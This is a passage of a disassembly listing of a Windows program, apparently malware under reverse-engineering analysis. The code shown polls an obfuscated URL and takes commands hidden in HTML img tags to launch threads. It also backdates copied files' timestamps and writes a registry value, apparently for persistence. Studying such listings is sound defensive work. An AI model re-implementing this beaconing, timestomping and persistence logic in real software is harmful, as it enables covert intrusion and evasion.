.text:00402D0C pop     ecx             ; 8 Flows to: 9
.text:00402D0D
.text:00402D0D loc_402D0D:             ; 9
.text:00402D0D cmp     dword_405910, 0
.text:00402D14 jnz     short loc_402D91 ; 9 Flows to: 10, 18
.text:00402D16 mov     esi, ds:Sleep   ; 10 Flows to: 11
.text:00402D1C
.text:00402D1C loc_402D1C:             ; 11
.text:00402D1C cmp     dword_405918, 0
.text:00402D23 jnz     short loc_402D61 ; 11 Flows to: 12, 13
.text:00402D25 lea     eax, [ebp+SystemTime] ; 12
.text:00402D28 push    eax             ; 12
.text:00402D29 call    ds:GetLocalTime ; 12
.text:00402D2F movzx   eax, [ebp+SystemTime.wMinute] ; 12
.text:00402D33 push    eax             ; 12
.text:00402D34 movzx   eax, [ebp+SystemTime.wHour] ; 12
.text:00402D38 push    eax             ; 12
.text:00402D39 push    ebx             ; 12
.text:00402D3A push    [ebp+VersionInformation.dwMinorVersion] ; 12
.text:00402D40 lea     eax, [edi+210h] ; 12
.text:00402D46 push    [ebp+VersionInformation.dwMajorVersion] ; 12
.text:00402D4C push    offset aMozilla40Compa ; 12
.text:00402D51 push    eax             ; 12
.text:00402D52 call    ds:sprintf      ; 12
.text:00402D58 push    edi             ; 12
.text:00402D59 call    sub_402ED8      ; 12
.text:00402D5E add     esp, 20h        ; 12 Flows to: 13
.text:00402D61
.text:00402D61 loc_402D61:             ; 13
.text:00402D61 cmp     dword_405910, 0
.text:00402D68 jnz     short loc_402D71 ; 13 Flows to: 14, 15
.text:00402D6A push    0EA60h          ; 14
.text:00402D6F call    esi ; Sleep     ; 14 Flows to: 15
.text:00402D71
.text:00402D71 loc_402D71:             ; 15
.text:00402D71 cmp     dword_405918, 0
.text:00402D78 jnz     short loc_402D88 ; 15 Flows to: 16, 17
.text:00402D7A mov     eax, dword_4056B8 ; 16
.text:00402D7F imul    eax, 0EA60h     ; 16
.text:00402D85 push    eax             ; 16
.text:00402D86 call    esi ; Sleep     ; 16 Flows to: 17
.text:00402D88
.text:00402D88 loc_402D88:             ; 17
.text:00402D88 cmp     dword_405910, 0
.text:00402D8F jz      short loc_402D1C ; 17 Flows to: 18, 11
.text:00402D91
.text:00402D91 loc_402D91:             ; 18
.text:00402D91 push    edi
.text:00402D92 call    ??3@YAXPAX@Z    ; 18
.text:00402D97 pop     ecx             ; 18
.text:00402D98 push    [ebp+hObject]   ; 18
.text:00402D9B call    ds:CloseHandle  ; 18
.text:00402DA1 xor     eax, eax        ; 18
.text:00402DA3 pop     ebx             ; 18 Flows to: 19
.text:00402DA4
.text:00402DA4 loc_402DA4:             ; 19
.text:00402DA4 pop     edi
.text:00402DA5 pop     esi             ; 19
.text:00402DA6 leave                   ; 19
.text:00402DA7 retn    4               ; 19
.text:00402DA7 sub_402C58 endp
.text:00402DA7
.text:00402DAA
.text:00402DAA
.text:00402DAA ; Attributes: bp-based frame
.text:00402DAA
.text:00402DAA ; int __cdecl sub_402DAA(LPCSTR lpExistingFileName, char *Source)
.text:00402DAA sub_402DAA proc near
.text:00402DAA
.text:00402DAA Dest= byte ptr -11Ch
.text:00402DAA SystemTime= _SYSTEMTIME ptr -18h
.text:00402DAA FileTime= _FILETIME ptr -8
.text:00402DAA lpExistingFileName= dword ptr  8
.text:00402DAA Source= dword ptr  0Ch
.text:00402DAA
.text:00402DAA push    ebp             ; 1
.text:00402DAB mov     ebp, esp        ; 1
.text:00402DAD sub     esp, 11Ch       ; 1
.text:00402DB3 push    ebx             ; 1
.text:00402DB4 push    esi             ; 1
.text:00402DB5 push    edi             ; 1
.text:00402DB6 lea     eax, [ebp+Dest] ; 1
.text:00402DBC push    [ebp+Source]    ; 1
.text:00402DBF push    eax             ; 1
.text:00402DC0 call    strcpy          ; 1
.text:00402DC5 lea     eax, [ebp+Dest] ; 1
.text:00402DCB push    5Ch             ; 1
.text:00402DCD push    eax             ; 1
.text:00402DCE call    ds:strrchr      ; 1
.text:00402DD4 add     esp, 10h        ; 1
.text:00402DD7 mov     esi, eax        ; 1
.text:00402DD9 xor     ebx, ebx        ; 1
.text:00402DDB lea     eax, [ebp+Dest] ; 1
.text:00402DE1 push    ebx             ; 1
.text:00402DE2 push    eax             ; 1
.text:00402DE3 mov     [esi], bl       ; 1
.text:00402DE5 push    hwnd            ; 1
.text:00402DEB call    ds:SHCreateDirectoryExA ; 1
.text:00402DF1 xor     ecx, ecx        ; 1
.text:00402DF3 test    eax, eax        ; 1
.text:00402DF5 setnl   cl              ; 1
.text:00402DF8 mov     edi, ecx        ; 1
.text:00402DFA cmp     edi, ebx        ; 1
.text:00402DFC jnz     short loc_402E0B ; 1 Flows to: 2, 3
.text:00402DFE call    ds:GetLastError ; 2
.text:00402E04 cmp     eax, 0B7h       ; 2
.text:00402E09 jnz     short loc_402E80 ; 2 Flows to: 3, 5
.text:00402E0B
.text:00402E0B loc_402E0B:             ; 3
.text:00402E0B push    ebx
.text:00402E0C mov     byte ptr [esi], 5Ch ; 3
.text:00402E0F push    [ebp+Source]    ; 3
.text:00402E12 push    [ebp+lpExistingFileName] ; 3
.text:00402E15 call    ds:CopyFileA    ; 3
.text:00402E1B push    ebx             ; 3
.text:00402E1C push    80h             ; 3
.text:00402E21 push    3               ; 3
.text:00402E23 push    ebx             ; 3
.text:00402E24 push    ebx             ; 3
.text:00402E25 push    40000000h       ; 3
.text:00402E2A push    [ebp+Source]    ; 3
.text:00402E2D mov     edi, eax        ; 3
.text:00402E2F call    ds:CreateFileA  ; 3
.text:00402E35 mov     esi, eax        ; 3
.text:00402E37 cmp     esi, 0FFFFFFFFh ; 3
.text:00402E3A jz      short loc_402E80 ; 3 Flows to: 4, 5
.text:00402E3C lea     eax, [ebp+SystemTime] ; 4
.text:00402E3F push    eax             ; 4
.text:00402E40 call    ds:GetSystemTime ; 4
.text:00402E46 lea     eax, [ebp+FileTime] ; 4
.text:00402E49 mov     [ebp+SystemTime.wYear], 7D3h ; 4
.text:00402E4F push    eax             ; 4
.text:00402E50 lea     eax, [ebp+SystemTime] ; 4
.text:00402E53 push    eax             ; 4
.text:00402E54 mov     [ebp+SystemTime.wMonth], 8 ; 4
.text:00402E5A mov     [ebp+SystemTime.wDay], 14h ; 4
.text:00402E60 call    ds:SystemTimeToFileTime ; 4
.text:00402E66 lea     eax, [ebp+FileTime] ; 4
.text:00402E69 push    eax             ; 4
.text:00402E6A lea     eax, [ebp+FileTime] ; 4
.text:00402E6D push    eax             ; 4
.text:00402E6E lea     eax, [ebp+FileTime] ; 4
.text:00402E71 push    eax             ; 4
.text:00402E72 push    esi             ; 4
.text:00402E73 call    ds:SetFileTime  ; 4
.text:00402E79 push    esi             ; 4
.text:00402E7A call    ds:CloseHandle  ; 4 Flows to: 5
.text:00402E80
.text:00402E80 loc_402E80:             ; 5
.text:00402E80 mov     eax, edi
.text:00402E82 pop     edi             ; 5
.text:00402E83 pop     esi             ; 5
.text:00402E84 pop     ebx             ; 5
.text:00402E85 leave                   ; 5
.text:00402E86 retn                    ; 5
.text:00402E86 sub_402DAA endp
.text:00402E86
.text:00402E87
.text:00402E87
.text:00402E87 ; Attributes: bp-based frame
.text:00402E87
.text:00402E87 ; int __cdecl sub_402E87(LPCSTR lpString)
.text:00402E87 sub_402E87 proc near
.text:00402E87
.text:00402E87 phkResult= dword ptr -4
.text:00402E87 lpString= dword ptr  8
.text:00402E87
.text:00402E87 push    ebp             ; 1
.text:00402E88 mov     ebp, esp        ; 1
.text:00402E8A push    ecx             ; 1
.text:00402E8B push    esi             ; 1
.text:00402E8C xor     esi, esi        ; 1
.text:00402E8E lea     eax, [ebp+phkResult] ; 1
.text:00402E91 push    esi             ; 1
.text:00402E92 push    eax             ; 1
.text:00402E93 push    esi             ; 1
.text:00402E94 push    0F003Fh         ; 1
.text:00402E99 push    esi             ; 1
.text:00402E9A push    esi             ; 1
.text:00402E9B push    esi             ; 1
.text:00402E9C push    offset SubKey   ; 1
.text:00402EA1 push    80000001h       ; 1
.text:00402EA6 call    ds:RegCreateKeyExA ; 1
.text:00402EAC push    [ebp+lpString]  ; 1
.text:00402EAF call    ds:lstrlenA     ; 1
.text:00402EB5 add     eax, eax        ; 1
.text:00402EB7 push    eax             ; 1
.text:00402EB8 push    [ebp+lpString]  ; 1
.text:00402EBB push    1               ; 1
.text:00402EBD push    esi             ; 1
.text:00402EBE push    offset ValueName ; 1
.text:00402EC3 push    [ebp+phkResult] ; 1
.text:00402EC6 call    ds:RegSetValueExA ; 1
.text:00402ECC push    [ebp+phkResult] ; 1
.text:00402ECF call    ds:RegCloseKey  ; 1
.text:00402ED5 pop     esi             ; 1
.text:00402ED6 leave                   ; 1
.text:00402ED7 retn                    ; 1
.text:00402ED7 sub_402E87 endp
.text:00402ED7
.text:00402ED8
.text:00402ED8
.text:00402ED8 ; Attributes: bp-based frame
.text:00402ED8
.text:00402ED8 ; int __cdecl sub_402ED8(char *)
.text:00402ED8 sub_402ED8 proc near
.text:00402ED8
.text:00402ED8 Dest= byte ptr -118h
.text:00402ED8 dwNumberOfBytesRead= dword ptr -18h
.text:00402ED8 var_14= dword ptr -14h
.text:00402ED8 var_10= dword ptr -10h
.text:00402ED8 hInternet= dword ptr -0Ch
.text:00402ED8 hFile= dword ptr -8
.text:00402ED8 var_4= dword ptr -4
.text:00402ED8 arg_0= dword ptr  8
.text:00402ED8
.text:00402ED8 push    ebp             ; 1
.text:00402ED9 mov     ebp, esp        ; 1
.text:00402EDB sub     esp, 118h       ; 1
.text:00402EE1 push    ebx             ; 1
.text:00402EE2 push    esi             ; 1
.text:00402EE3 push    edi             ; 1
.text:00402EE4 lea     eax, [ebp+Dest] ; 1
.text:00402EEA xor     esi, esi        ; 1
.text:00402EEC push    offset aDeeatUeiUUdUeA ; 1
.text:00402EF1 push    eax             ; 1
.text:00402EF2 mov     [ebp+var_10], esi ; 1
.text:00402EF5 call    strcpy          ; 1
.text:00402EFA lea     eax, [ebp+Dest] ; 1
.text:00402F00 push    eax             ; 1
.text:00402F01 call    strlen          ; 1
.text:00402F06 mov     edi, eax        ; 1
.text:00402F08 add     esp, 0Ch        ; 1
.text:00402F0B xor     edx, edx        ; 1
.text:00402F0D cmp     edi, esi        ; 1
.text:00402F0F jbe     short loc_402F2A ; 1 Flows to: 2, 3
.text:00402F11
.text:00402F11 loc_402F11:             ; 2
.text:00402F11 mov     al, [ebp+edx+Dest]
.text:00402F18 lea     ecx, [ebp+edx+Dest] ; 2
.text:00402F1F sar     al, 1           ; 2
.text:00402F21 and     al, 7Fh         ; 2
.text:00402F23 inc     edx             ; 2
.text:00402F24 cmp     edx, edi        ; 2
.text:00402F26 mov     [ecx], al       ; 2
.text:00402F28 jb      short loc_402F11 ; 2 Flows to: 3, 2
.text:00402F2A
.text:00402F2A loc_402F2A:             ; 3
.text:00402F2A mov     edi, [ebp+arg_0]
.text:00402F2D push    esi             ; 3
.text:00402F2E push    esi             ; 3
.text:00402F2F push    esi             ; 3
.text:00402F30 lea     eax, [edi+210h] ; 3
.text:00402F36 push    esi             ; 3
.text:00402F37 push    eax             ; 3
.text:00402F38 call    ds:InternetOpenA ; 3
.text:00402F3E cmp     eax, esi        ; 3
.text:00402F40 mov     [ebp+hInternet], eax ; 3
.text:00402F43 jz      loc_402FEE      ; 3 Flows to: 4, 14
.text:00402F49 push    esi             ; 4
.text:00402F4A push    80000000h       ; 4
.text:00402F4F push    esi             ; 4
.text:00402F50 lea     ecx, [ebp+Dest] ; 4
.text:00402F56 push    esi             ; 4
.text:00402F57 push    ecx             ; 4
.text:00402F58 push    eax             ; 4
.text:00402F59 call    ds:InternetOpenUrlA ; 4
.text:00402F5F cmp     eax, esi        ; 4
.text:00402F61 mov     [ebp+hFile], eax ; 4
.text:00402F64 jz      loc_402FFC      ; 4 Flows to: 5, 16
.text:00402F6A
.text:00402F6A loc_402F6A:             ; 5
.text:00402F6A lea     eax, [ebp+dwNumberOfBytesRead]
.text:00402F6D lea     ebx, [edi+210h] ; 5
.text:00402F73 push    eax             ; 5
.text:00402F74 push    1000h           ; 5
.text:00402F79 push    ebx             ; 5
.text:00402F7A push    [ebp+hFile]     ; 5
.text:00402F7D call    ds:InternetReadFile ; 5
.text:00402F83 test    eax, eax        ; 5
.text:00402F85 jz      short loc_402FEE ; 5 Flows to: 6, 14
.text:00402F87 mov     eax, [ebp+dwNumberOfBytesRead] ; 6
.text:00402F8A cmp     eax, esi        ; 6
.text:00402F8C jz      short loc_402FE7 ; 6 Flows to: 7, 13
.text:00402F8E mov     [ebp+var_4], eax ; 7 Flows to: 8
.text:00402F91
.text:00402F91 loc_402F91:             ; 8
.text:00402F91 lea     eax, [ebp+var_14]
.text:00402F94 push    eax             ; 8
.text:00402F95 push    [ebp+var_4]     ; 8
.text:00402F98 push    ebx             ; 8
.text:00402F99 call    sub_4032CB      ; 8
.text:00402F9E mov     esi, eax        ; 8
.text:00402FA0 add     esp, 0Ch        ; 8
.text:00402FA3 test    esi, esi        ; 8
.text:00402FA5 jz      short loc_402FD4 ; 8 Flows to: 9, 11
.text:00402FA7 cmp     esi, 100h       ; 9
.text:00402FAD jnb     short loc_402FD4 ; 9 Flows to: 10, 11
.text:00402FAF mov     eax, [ebp+var_14] ; 10
.text:00402FB2 add     edi, 110h       ; 10
.text:00402FB8 add     eax, ebx        ; 10
.text:00402FBA push    esi             ; 10
.text:00402FBB push    eax             ; 10
.text:00402FBC push    edi             ; 10
.text:00402FBD call    memcpy          ; 10
.text:00402FC2 push    [ebp+arg_0]     ; 10
.text:00402FC5 and     byte ptr [edi+esi], 0 ; 10
.text:00402FC9 call    sub_403085      ; 10
.text:00402FCE mov     edi, [ebp+arg_0] ; 10
.text:00402FD1 add     esp, 10h        ; 10 Flows to: 11
.text:00402FD4
.text:00402FD4 loc_402FD4:             ; 11
.text:00402FD4 mov     eax, [ebp+var_14]
.text:00402FD7 lea     ecx, [eax+esi]  ; 11
.text:00402FDA add     eax, esi        ; 11
.text:00402FDC sub     [ebp+var_4], eax ; 11
.text:00402FDF add     ebx, ecx        ; 11
.text:00402FE1 test    esi, esi        ; 11
.text:00402FE3 jnz     short loc_402F91 ; 11 Flows to: 12, 8
.text:00402FE5 jmp     short loc_402F6A ; 12 Flows to: 5
.text:00402FE7
.text:00402FE7 loc_402FE7:             ; 13 Flows to: 14
.text:00402FE7 mov     [ebp+var_10], 1
.text:00402FEE
.text:00402FEE loc_402FEE:             ; 14
.text:00402FEE cmp     [ebp+hFile], esi
.text:00402FF1 jz      short loc_402FFC ; 14 Flows to: 15, 16
.text:00402FF3 push    [ebp+hFile]     ; 15
.text:00402FF6 call    ds:InternetCloseHandle ; 15 Flows to: 16
.text:00402FFC
.text:00402FFC loc_402FFC:             ; 16
.text:00402FFC cmp     [ebp+hInternet], esi
.text:00402FFF pop     edi             ; 16
.text:00403000 pop     esi             ; 16
.text:00403001 pop     ebx             ; 16
.text:00403002 jz      short loc_40300D ; 16 Flows to: 17, 18
.text:00403004 push    [ebp+hInternet] ; 17
.text:00403007 call    ds:InternetCloseHandle ; 17 Flows to: 18
.text:0040300D
.text:0040300D loc_40300D:             ; 18
.text:0040300D mov     eax, [ebp+var_10]
.text:00403010 leave                   ; 18
.text:00403011 retn                    ; 18
.text:00403011 sub_402ED8 endp
.text:00403011
.text:00403012
.text:00403012
.text:00403012 ; Attributes: bp-based frame
.text:00403012
.text:00403012 ; int __cdecl sub_403012(char *Str, char *SubStr, int)
.text:00403012 sub_403012 proc near
.text:00403012
.text:00403012 Str= dword ptr  8
.text:00403012 SubStr= dword ptr  0Ch
.text:00403012 arg_8= dword ptr  10h
.text:00403012
.text:00403012 push    ebp             ; 1
.text:00403013 mov     ebp, esp        ; 1
.text:00403015 cmp     [ebp+Str], 0    ; 1
.text:00403019 push    esi             ; 1
.text:0040301A jz      short loc_403080 ; 1 Flows to: 2, 13
.text:0040301C cmp     [ebp+SubStr], 0 ; 2
.text:00403020 jz      short loc_403080 ; 2 Flows to: 3, 13
.text:00403022 push    [ebp+SubStr]    ; 3
.text:00403025 push    [ebp+Str]       ; 3
.text:00403028 call    ds:strstr       ; 3
.text:0040302E mov     esi, eax        ; 3
.text:00403030 pop     ecx             ; 3
.text:00403031 test    esi, esi        ; 3
.text:00403033 pop     ecx             ; 3
.text:00403034 jz      short loc_403080 ; 3 Flows to: 4, 13
.text:00403036 push    [ebp+SubStr]    ; 4
.text:00403039 call    strlen          ; 4
.text:0040303E cmp     byte ptr [eax+esi], 22h ; 4
.text:00403042 pop     ecx             ; 4
.text:00403043 jnz     short loc_403046 ; 4 Flows to: 5, 6
.text:00403045 inc     eax             ; 5 Flows to: 6
.text:00403046
.text:00403046 loc_403046:             ; 6
.text:00403046 mov     cl, [eax+esi]
.text:00403049 xor     edx, edx        ; 6
.text:0040304B push    edi             ; 6
.text:0040304C mov     edi, [ebp+arg_8] ; 6
.text:0040304F cmp     cl, 22h         ; 6
.text:00403052 jz      short loc_40306B ; 6 Flows to: 7, 10
.text:00403054
.text:00403054 loc_403054:             ; 7
.text:00403054 test    cl, cl
.text:00403056 jz      short loc_40306B ; 7 Flows to: 8, 10
.text:00403058 cmp     cl, 20h         ; 8
.text:0040305B jz      short loc_40306B ; 8 Flows to: 9, 10
.text:0040305D mov     [edx+edi], cl   ; 9
.text:00403060 mov     cl, [eax+esi+1] ; 9
.text:00403064 inc     edx             ; 9
.text:00403065 inc     eax             ; 9
.text:00403066 cmp     cl, 22h         ; 9
.text:00403069 jnz     short loc_403054 ; 9 Flows to: 10, 7
.text:0040306B
.text:0040306B loc_40306B:             ; 10
.text:0040306B and     byte ptr [edx+edi], 0
.text:0040306F mov     al, [eax+esi]   ; 10
.text:00403072 cmp     al, 22h         ; 10
.text:00403074 pop     edi             ; 10
.text:00403075 jz      short loc_40307B ; 10 Flows to: 11, 12
.text:00403077 cmp     al, 20h         ; 11
.text:00403079 jnz     short loc_403080 ; 11 Flows to: 12, 13
.text:0040307B
.text:0040307B loc_40307B:             ; 12
.text:0040307B push    1
.text:0040307D pop     eax             ; 12
.text:0040307E jmp     short loc_403082 ; 12 Flows to: 14
.text:00403080
.text:00403080 loc_403080:             ; 13 Flows to: 14
.text:00403080 xor     eax, eax
.text:00403082
.text:00403082 loc_403082:             ; 14
.text:00403082 pop     esi
.text:00403083 pop     ebp             ; 14
.text:00403084 retn                    ; 14
.text:00403084 sub_403012 endp
.text:00403084
.text:00403085
.text:00403085
.text:00403085 ; Attributes: bp-based frame
.text:00403085
.text:00403085 ; int __cdecl sub_403085(char *)
.text:00403085 sub_403085 proc near
.text:00403085
.text:00403085 Str= byte ptr -208h
.text:00403085 Source= byte ptr -207h
.text:00403085 var_8= dword ptr -8
.text:00403085 var_1= byte ptr -1
.text:00403085 arg_0= dword ptr  8
.text:00403085
.text:00403085 push    ebp             ; 1
.text:00403086 mov     ebp, esp        ; 1
.text:00403088 sub     esp, 208h       ; 1
.text:0040308E push    ebx             ; 1
.text:0040308F and     [ebp+var_1], 0  ; 1
.text:00403093 push    esi             ; 1
.text:00403094 push    edi             ; 1
.text:00403095 mov     edi, [ebp+arg_0] ; 1
.text:00403098 lea     esi, [edi+110h] ; 1
.text:0040309E mov     ecx, esi        ; 1 Flows to: 2
.text:004030A0
.text:004030A0 loc_4030A0:             ; 2
.text:004030A0 mov     al, [ecx]
.text:004030A2 test    al, al          ; 2
.text:004030A4 jz      short loc_4030AC ; 2 Flows to: 3, 4
.text:004030A6 add     [ebp+var_1], al ; 3
.text:004030A9 inc     ecx             ; 3
.text:004030AA jmp     short loc_4030A0 ; 3 Flows to: 2
.text:004030AC
.text:004030AC loc_4030AC:             ; 4
.text:004030AC cmp     byte ptr [esi], 0Dh
.text:004030AF mov     [ebp+arg_0], esi ; 4
.text:004030B2 jnz     short loc_4030B9 ; 4 Flows to: 5, 6
.text:004030B4 inc     esi             ; 5
.text:004030B5 inc     esi             ; 5
.text:004030B6 mov     [ebp+arg_0], esi ; 5 Flows to: 6
.text:004030B9
.text:004030B9 loc_4030B9:             ; 6
.text:004030B9 push    4
.text:004030BB push    offset aImg     ; 6
.text:004030C0 push    esi             ; 6
.text:004030C1 call    ds:_strnicmp    ; 6
.text:004030C7 add     esp, 0Ch        ; 6
.text:004030CA test    eax, eax        ; 6
.text:004030CC jnz     loc_4032C4      ; 6 Flows to: 7, 34
.text:004030D2 push    offset SubStr   ; 7
.text:004030D7 push    esi             ; 7
.text:004030D8 call    ds:strstr       ; 7
.text:004030DE pop     ecx             ; 7
.text:004030DF test    eax, eax        ; 7
.text:004030E1 pop     ecx             ; 7
.text:004030E2 jz      loc_4032C4      ; 7 Flows to: 8, 34
.text:004030E8 movsx   eax, byte ptr [eax+7] ; 8
.text:004030EC sub     eax, 30h        ; 8
.text:004030EF mov     [ebp+var_8], eax ; 8
.text:004030F2 lea     eax, [ebp+Str]  ; 8
.text:004030F8 push    eax             ; 8
.text:004030F9 push    offset aSrc     ; 8
.text:004030FE push    esi             ; 8
.text:004030FF call    sub_403012      ; 8
.text:00403104 add     esp, 0Ch        ; 8
.text:00403107 test    eax, eax        ; 8
.text:00403109 jz      loc_4032C4      ; 8 Flows to: 9, 34
.text:0040310F mov     esi, ds:strrchr ; 9
.text:00403115 lea     eax, [ebp+Str]  ; 9
.text:0040311B push    23h             ; 9
.text:0040311D push    eax             ; 9
.text:0040311E call    esi ; strrchr   ; 9
.text:00403120 mov     ebx, eax        ; 9
.text:00403122 pop     ecx             ; 9
.text:00403123 test    ebx, ebx        ; 9
.text:00403125 pop     ecx             ; 9
.text:00403126 jz      loc_4032C4      ; 9 Flows to: 10, 34
.text:0040312C push    2Eh             ; 10
.text:0040312E push    ebx             ; 10
.text:0040312F call    esi ; strrchr   ; 10
.text:00403131 pop     ecx             ; 10
.text:00403132 test    eax, eax        ; 10
.text:00403134 pop     ecx             ; 10
.text:00403135 jz      loc_4032C4      ; 10 Flows to: 11, 34
.text:0040313B and     byte ptr [eax], 0 ; 11
.text:0040313E inc     ebx             ; 11
.text:0040313F push    ebx             ; 11
.text:00403140 call    sub_403798      ; 11
.text:00403145 add     edi, 100h       ; 11
.text:0040314B push    ebx             ; 11
.text:0040314C push    edi             ; 11
.text:0040314D mov     edi, ds:_strcmpi ; 11
.text:00403153 call    edi ; _strcmpi  ; 11
.text:00403155 add     esp, 0Ch        ; 11
.text:00403158 test    eax, eax        ; 11
.text:0040315A jz      short loc_40316A ; 11 Flows to: 12, 13
.text:0040315C push    offset aAny     ; 12
.text:00403161 push    ebx             ; 12
.text:00403162 call    edi ; _strcmpi  ; 12
.text:00403164 pop     ecx             ; 12
.text:00403165 test    eax, eax        ; 12
.text:00403167 pop     ecx             ; 12
.text:00403168 jnz     short loc_4031AF ; 12 Flows to: 13, 21
.text:0040316A
.text:0040316A loc_40316A:             ; 13
.text:0040316A mov     eax, [ebp+var_8]
.text:0040316D xor     edi, edi        ; 13
.text:0040316F sub     eax, edi        ; 13
.text:00403171 jz      loc_40328A      ; 13 Flows to: 14, 30
.text:00403177 dec     eax             ; 14
.text:00403178 jz      loc_403226      ; 14 Flows to: 15, 26
.text:0040317E dec     eax             ; 15
.text:0040317F jz      short loc_4031A4 ; 15 Flows to: 16, 20
.text:00403181 dec     eax             ; 16
.text:00403182 jz      short loc_403195 ; 16 Flows to: 17, 19
.text:00403184 dec     eax             ; 17
.text:00403185 jnz     loc_4032BC      ; 17 Flows to: 18, 33
.text:0040318B call    sub_4035C2      ; 18
.text:00403190 jmp     loc_4032BC      ; 18 Flows to: 33
.text:00403195
.text:00403195 loc_403195:             ; 19
.text:00403195 mov     dword_405910, 1
.text:0040319F jmp     loc_4032BC      ; 19 Flows to: 33
.text:004031A4
.text:004031A4 loc_4031A4:             ; 20
.text:004031A4 mov     al, [ebp+var_1]
.text:004031A7 cmp     al, byte_405914 ; 20
.text:004031AD jnz     short loc_4031B7 ; 20 Flows to: 21, 22
.text:004031AF
.text:004031AF loc_4031AF:             ; 21
.text:004031AF push    1
.text:004031B1 pop     eax             ; 21
.text:004031B2 jmp     loc_4032C6      ; 21 Flows to: 35
.text:004031B7
.text:004031B7 loc_4031B7:             ; 22
.text:004031B7 lea     eax, [ebp+Str]
.text:004031BD push    2Fh             ; 22
.text:004031BF push    eax             ; 22
.text:004031C0 call    esi ; strrchr   ; 22
.text:004031C2 pop     ecx             ; 22
.text:004031C3 cmp     eax, edi        ; 22
.text:004031C5 pop     ecx             ; 22
.text:004031C6 jz      loc_4032C4      ; 22 Flows to: 23, 34
.text:004031CC and     byte ptr [eax], 0 ; 23
.text:004031CF lea     eax, [ebp+Source] ; 23
.text:004031D5 push    eax             ; 23
.text:004031D6 call    sub_403798      ; 23
.text:004031DB lea     eax, [ebp+Source] ; 23
.text:004031E1 push    eax             ; 23
.text:004031E2 call    strlen          ; 23
.text:004031E7 inc     eax             ; 23
.text:004031E8 push    eax             ; 23
.text:004031E9 call    ??2@YAPAXI@Z    ; 23
.text:004031EE mov     esi, eax        ; 23
.text:004031F0 add     esp, 0Ch        ; 23
.text:004031F3 cmp     esi, edi        ; 23
.text:004031F5 jz      loc_4032C4      ; 23 Flows to: 24, 34
.text:004031FB lea     eax, [ebp+Source] ; 24
.text:00403201 push    eax             ; 24
.text:00403202 push    esi             ; 24
.text:00403203 call    strcpy          ; 24
.text:00403208 pop     ecx             ; 24
.text:00403209 pop     ecx             ; 24
.text:0040320A push    edi             ; 24
.text:0040320B push    edi             ; 24
.text:0040320C push    esi             ; 24
.text:0040320D push    offset sub_4033F4 ; 24 Flows to: 25
.text:00403212
.text:00403212 loc_403212:             ; 25
.text:00403212 push    edi
.text:00403213 push    edi             ; 25
.text:00403214 call    ds:CreateThread ; 25
.text:0040321A push    eax             ; 25
.text:0040321B call    ds:CloseHandle  ; 25
.text:00403221 jmp     loc_4032BC      ; 25 Flows to: 33
.text:00403226
.text:00403226 loc_403226:             ; 26
.text:00403226 mov     al, [ebp+var_1]
.text:00403229 cmp     al, byte_405914 ; 26
.text:0040322F jz      loc_4031AF      ; 26 Flows to: 27, 21
.text:00403235 lea     eax, [ebp+Str]  ; 27
.text:0040323B push    2Fh             ; 27
.text:0040323D push    eax             ; 27
.text:0040323E call    esi ; strrchr   ; 27
.text:00403240 pop     ecx             ; 27
.text:00403241 cmp     eax, edi        ; 27
.text:00403243 pop     ecx             ; 27
.text:00403244 jz      short loc_4032C4 ; 27 Flows to: 28, 34
.text:00403246 and     byte ptr [eax], 0 ; 28
.text:00403249 lea     eax, [ebp+Source] ; 28
.text:0040324F push    eax             ; 28
.text:00403250 call    sub_403798      ; 28
.text:00403255 lea     eax, [ebp+Source] ; 28
.text:0040325B push    eax             ; 28
.text:0040325C call    strlen          ; 28
.text:00403261 inc     eax             ; 28
.text:00403262 push    eax             ; 28
.text:00403263 call    ??2@YAPAXI@Z    ; 28
.text:00403268 mov     esi, eax        ; 28
.text:0040326A add     esp, 0Ch        ; 28
.text:0040326D cmp     esi, edi        ; 28
.text:0040326F jz      short loc_4032C4 ; 28 Flows to: 29, 34
.text:00403271 lea     eax, [ebp+Source] ; 29
.text:00403277 push    eax             ; 29
.text:00403278 push    esi             ; 29
.text:00403279 call    strcpy          ; 29
.text:0040327E pop     ecx             ; 29
.text:0040327F pop     ecx             ; 29
.text:00403280 push    edi             ; 29
.text:00403281 push    edi             ; 29
.text:00403282 push    esi             ; 29
.text:00403283 push    offset sub_403339 ; 29
.text:00403288 jmp     short loc_403212 ; 29 Flows to: 25
.text:0040328A
.text:0040328A loc_40328A:             ; 30
.text:0040328A lea     eax, [ebp+Str]
.text:00403290 push    eax             ; 30
.text:00403291 push    offset aWidth   ; 30
.text:00403296 push    [ebp+arg_0]     ; 30
.text:00403299 call    sub_403012      ; 30
.text:0040329E add     esp, 0Ch        ; 30
.text:004032A1 test    eax, eax        ; 30
.text:004032A3 jz      short loc_4032BC ; 30 Flows to: 31, 33
.text:004032A5 lea     eax, [ebp+Str]  ; 31
.text:004032AB push    eax             ; 31
.text:004032AC call    ds:atoi         ; 31
.text:004032B2 cmp     eax, edi        ; 31
.text:004032B4 pop     ecx             ; 31
.text:004032B5 jz      short loc_4032BC ; 31 Flows to: 32, 33
.text:004032B7 mov     dword_4056B8, eax ; 32 Flows to: 33
.text:004032BC
.text:004032BC loc_4032BC:             ; 33
.text:004032BC mov     al, [ebp+var_1]
.text:004032BF mov     byte_405914, al ; 33 Flows to: 34
.text:004032C4
.text:004032C4 loc_4032C4:             ; 34 Flows to: 35
.text:004032C4 xor     eax, eax
.text:004032C6
.text:004032C6 loc_4032C6:             ; 35
.text:004032C6 pop     edi
.text:004032C7 pop     esi             ; 35
.text:004032C8 pop     ebx             ; 35
.text:004032C9 leave                   ; 35
.text:004032CA retn                    ; 35
.text:004032CA sub_403085 endp
.text:004032CA
.text:004032CB
.text:004032CB
.text:004032CB
.text:004032CB sub_4032CB proc near
.text:004032CB
.text:004032CB arg_0= dword ptr  4
.text:004032CB arg_4= dword ptr  8
.text:004032CB arg_8= dword ptr  0Ch
.text:004032CB
.text:004032CB push    esi             ; 1
.text:004032CC push    edi             ; 1
.text:004032CD mov     edi, [esp+8+arg_4] ; 1
.text:004032D1 xor     edx, edx        ; 1
.text:004032D3 lea     eax, [edi-6]    ; 1
.text:004032D6 test    eax, eax        ; 1
.text:004032D8 jz      short loc_403334 ; 1 Flows to: 2, 16
.text:004032DA mov     ecx, [esp+8+arg_0] ; 2 Flows to: 3
.text:004032DE
.text:004032DE loc_4032DE:             ; 3
.text:004032DE cmp     byte ptr [ecx+edx], 3Ch
.text:004032E2 lea     eax, [edx+4]    ; 3
.text:004032E5 jnz     short loc_40331A ; 3 Flows to: 4, 13
.text:004032E7 cmp     byte ptr [ecx+edx+1], 21h ; 4
